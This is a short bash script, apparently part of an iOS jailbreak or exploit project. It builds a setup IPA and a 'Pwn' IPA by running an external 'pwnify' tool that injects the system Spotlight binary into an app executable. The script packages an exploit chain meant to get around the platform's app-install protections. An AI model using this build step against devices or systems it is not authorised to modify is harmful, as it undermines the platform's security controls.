#!/bin/bash

set -e

if [ "$#" -ne 2 ]; then
    echo "Usage: build_ipas.sh <path to Fungus14App.app> <path to mounted root file system>"
    exit -1
fi

if [ ! -f "./pwnify_compiled" ]; then
    echo "Couldn't find ./pwnify_compiled"
    echo "Please compile pwnify and put it into the current directory as pwnify_compiled"
    exit -1
fi

# Create IPA structure
mkdir -p Payload
rm -rf Payload/Fungus14App.app
rm -f Fungus14_Setup.ipa Fungus14_Pwn.ipa

# Build first IPA
cp -r "$1" Payload/Fungus14App.app
zip -r Fungus14_Setup.ipa Payload

# Inject Spotlight
./pwnify_compiled Payload/Fungus14App.app/Fungus14App "$2/Applications/Spotlight.app/Spotlight"

# Build second IPA
cp Fungus14_Setup.ipa Fungus14_Pwn.ipa
zip Fungus14_Pwn.ipa Payload/Fungus14App.app/Fungus14App

rm -rf Payload
